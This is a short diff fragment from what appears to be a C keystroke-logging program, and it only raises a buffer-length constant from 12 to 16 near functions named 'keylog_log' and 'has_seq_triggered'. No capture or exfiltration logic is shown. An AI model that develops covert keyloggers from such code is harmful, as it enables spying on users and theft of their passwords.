@@ -110,7 +110,7 @@ static bool has_seq_triggered(unsigned short ev_code,
  *    unsigned int value;
  * }
  */
-#define BUFLEN 12
+#define BUFLEN 16
 
 static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
 {
